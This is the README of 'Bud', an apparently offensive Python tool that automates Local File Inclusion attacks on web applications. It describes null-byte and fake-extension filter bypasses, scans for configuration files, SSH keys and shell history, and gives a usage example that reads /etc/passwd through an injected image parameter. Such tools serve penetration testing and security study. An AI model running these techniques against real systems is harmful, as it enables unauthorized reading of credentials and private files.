# Bud :D
This script automatically extracts user / system files trough Local File Inclusion.

# Current features:
* inject anywhere (parameter + path) (use the * to set the injection point)
* checks absolute path and relative path method
* supports suffix bypass by using a null-byte
* supports filter bypass by using a null-byte + fake extension
* scans for readable configuration files (Apache, MySQL, Nginx, SSHd and DHCPclient)
* scans for readable user files (.ssh files, user profile, bashrc, history file)
* scans for possible log injection (Apache + Nginx)
* gathers some basic system info
* supports all 7392 genders and Python 2.x & 3.x

# How to install
* git clone https://github.com/stefan2200/Bud.git bud
* cd bud
* pip install -r requirements.txt
* python bud.py -hh

# Basic usage
```
$ python bud.py -u "http://vulie.local/image.php?mime=jpg&src=*" -e jpg -i
-u: the url to start with, needs mime set to extension to actually call the vuln function
also both mime and extension must be a valid image format
-e jpg to append a null-byte followed by the fake extension
back-end sees: /etc/passwd\0.jpg
server sees: /etc/passwd
```
*Output of this command is available in results.txt*
```
Usage: bud.py [options]

Options:
  -h, --help            show this help message and exit
  -u URL                The URL to start with including an astrix (*) for the
                        inject point
  -n, --null-byte       Use a null-byte to bypass suffix
  -e ERROR_TEXT, --error=ERROR_TEXT
                        Text to look for when a file is not found, default:
                        auto detect
  -p, --print           Text to look for when a file is not found, default:
                        auto detect
  -i, --ignore          Do not print files that are not found
  -f FAKE_EXTENSION, --fake-ext=FAKE_EXTENSION
                        Use null-byte followed by this fake extension (enables
                        -n)
```